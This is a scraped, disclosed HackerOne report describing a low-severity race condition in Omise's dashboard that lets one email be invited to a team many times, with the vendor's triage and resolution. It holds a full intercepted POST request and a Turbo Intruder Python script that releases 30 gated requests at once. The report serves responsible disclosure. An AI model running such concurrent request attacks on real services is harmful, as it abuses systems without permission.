---
title: "Race condition on action: Invite members to a team"
author: sim4n6
url: https://hackerone.com/reports/1285538
date_published: 2021-07-31
date_scraped: 2026-11-17
platform: hackerone
disclosed_report: https://hackerone.com/reports/1285538
bounty: not stated (awarded by Omise, amount hidden on page)
vuln_class: race-conditions
---

<!-- Raw scraped text below. Public, non-paywalled content only. -->

Report #1285538. Reported to Omise on July 31, 2021, 3:37pm UTC by sim4n6. Status: Resolved. Severity: Low (0.1 ~ 3.9). Weakness: Business Logic Errors. CVE: None. Disclosed March 22, 2022. Bounty/Retest/Total reward: Hidden (a bounty was awarded).

## Summary:

Hello there,

I've found a race condition vulnerability which allows the invitation of the same member multiple times to a single team via the dashboard.

## Tools needed:

- Burp Suite community edition with the extension Turbo Intruder.
This is the way I adopted to detect such vulnerability, there is also other ways.

## Steps to reproduce:

1. Login to an account on omise.co.
2. Invite a member for testing
3. Intercept the main request to the endpoint /team/memberships using the method POST. Modify the HTTP/1.1 protocol for the communication and add `x-request: %s` for Turbo intruder extension.

```
POST /team/memberships HTTP/2
Host: dashboard.omise.co
Cookie: [REDACTED]
Content-Length: 271
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="91", " Not;A Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Upgrade-Insecure-Requests: 1
Origin: [REDACTED]
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: [REDACTED]
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
x-request: %s
Connection: close

authenticity_token=<TOKEN>email=<INVITED-EMAIL>&membership%5Badmin%5D=0&membership%5Badmin%5D=1&membership%5Btechnical%5D=0&membership%5Btechnical%5D=1&commit=Send+invitation
```

4. Send the modified intercepted request with the invited member to Turbo intruder, and write the following attack code :

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    for i in range(30):
        engine.queue(target.req, target.baseInput, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)
```

5. Start the Turbo intruder attack. The results are captured in the following screenshots: [screenshot redacted by HackerOne]
As you can see there is multiple `200 OK` which means a race condition vulnerability happened.

6. Check the list of invited members to the team. In my case, I used in this attack the invited member : [REDACTED]. As you can see the list of invited members to the team is duplicate many times. [screenshot redacted]

However, when the invited user is already invited. You get the following error message : [screenshot redacted]

7. As consequence of the attack, the same email got invited and received multiple emails as can be seen in the following email: [screenshot redacted]

8. By the way, the bug persists even if the invited member accept the invitation. More invitations will remain in the list of the invited members of the team which is undesirable by design.

If you need any further details, please let me know.
Regards.

## Impact

Race Condition vulnerability allows the invitation of the same user multiple times.

## Timeline / comments

**sim4n6 posted a comment** (updated March 11, 2025):

Same thing happens on the endpoint `/test/links`. Create the same link multiple times as can be seen in the following screenshot: [redacted]

**Impact** : Create the same link multiple times (undesirable bug by design).

sim4n6 updated the severity to low. (July 31, 2021, 3:48pm UTC)

**napatbo (Omise) changed the status to Triaged.**

Hi @[redacted],

We have verified your report and have accepted that it is a bug. Now we will work on fixing it.
We do not pay out any bounty until we released the fix in production. This so you can IF you want hold us accountable that we actually fixed the issue.

The time it takes to fix bugs are different depending on complexity, it can be anything from one day or two. To a couple of weeks at most.

Thank you again. We will get back to you when we have a resolution.

Regards,
Omise Security

**sim4n6 posted a comment:**

Perfect, thank you in advance. An I just wanna add this side effect in the following screenshot: [redacted]

**sim4n6 posted a comment** (September 1, 2021):

Hi @napatbo, Aby update please? If you need to perform a **retest**, feel free to let me know.

**Omise rewarded sim4n6 with a bounty.**

Hi @[redacted]

We are still in the process of fixing it. In the meantime, let me award you first.

Regards,
Omise Security

**sim4n6 posted a comment** (September 2, 2021):

Hi @Omise, thank you very much for the bounty.

napatbo closed the report and changed the status to **Resolved**. (November 30, 2021)

sim4n6 requested to disclose this report. (February 20, 2022)

This report has been disclosed. (March 22, 2022)

## Metadata sidebar

Reported on July 31, 2021, 3:37pm UTC. Reported by sim4n6. Reported to Omise. Participants: sim4n6, napatbo. Severity Low (0.1 ~ 3.9). Weakness: Business Logic Errors. CVE ID: None. Bounty: Hidden. Retest: Hidden. Total reward: Hidden. Account details: None.

Capture status: FULL (public body, timeline, and metadata rendered; screenshots are images not captured).
